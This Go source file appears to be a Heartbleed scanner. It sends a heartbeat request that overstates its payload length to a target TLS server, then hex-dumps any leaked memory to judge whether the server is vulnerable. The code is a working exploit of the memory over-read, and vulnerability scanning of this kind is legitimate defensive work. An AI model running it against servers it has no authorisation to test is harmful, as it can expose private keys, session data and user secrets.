package heartbleed

import (
	"bytes"
	_ "crypto/sha256"
	_ "crypto/sha512"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"syscall"
	"time"

	"github.com/chrisDeFouRire/Heartbleed/heartbleed/tls"
)

type Target struct {
	Hostname string
	HostIp   string
	Port     int32
	Service  string
}

var Safe = errors.New("heartbleed: no response or payload not found")
var Closed = errors.New("heartbleed: the site closed/reset the connection (usually a safe reaction to the heartbeat)")
var Timeout = errors.New("heartbleed: timeout")

var padding = []byte(" YELLOW SUBMARINE ")

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte, host string) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+40+len(host)))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(padding)
	if err != nil {
		panic(err)
	}
	_, err = buf.WriteString(host)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (string, error) {
	host := tgt.HostIp
	host = fmt.Sprintf("%s:%d", host, tgt.Port)

	net_conn, err := net.DialTimeout("tcp", host, time.Duration(3)*time.Second)
	if err != nil {
		return "", err
	}
	net_conn.SetDeadline(time.Now().Add(time.Duration(10) * time.Second))

	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: skipVerify, ServerName: tgt.Hostname})
	defer conn.Close()

	err = conn.Handshake()
	if err != nil {
		return "", err
	}

	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)))
	if err != nil {
		return "", err
	}

	res := make(chan error)
	closeNotifySent := false
	go func() {
		// Needed to process the incoming heartbeat
		_, err := conn.Read(nil)

		nerr, ok := err.(*net.OpError)
		if ok && nerr.Err != nil && nerr.Err.Error() == "unexpected message" {
			res <- Safe
			return
		}

		if err == io.EOF || (err != nil && err.Error() == "EOF") ||
			(ok && nerr.Err == syscall.ECONNRESET) {
			if closeNotifySent && (err == io.EOF || err.Error() == "EOF") {
				// the connection terminated normally
				res <- Safe
				return
			} else {
				// early on-heartbeat connection closures
				res <- Closed
				return
			}
		}

		res <- err
	}()

	go func() {
		// Check if the server is still alive
		time.Sleep(3 * time.Second)
		conn.SendCloseNotify()
		closeNotifySent = true
	}()

	select {
	case data := <-conn.Heartbeats:
		out := hex.Dump(data)
		if bytes.Index(data, padding) == -1 {
			return "", Safe
		}
		if strings.Index(string(data), host) == -1 {
			return "", errors.New("Please try again")
		}

		// Vulnerable
		return out, nil

	case r := <-res:
		return "", r

	case <-time.After(time.Duration(8) * time.Second):
		return "", Timeout
	}

}
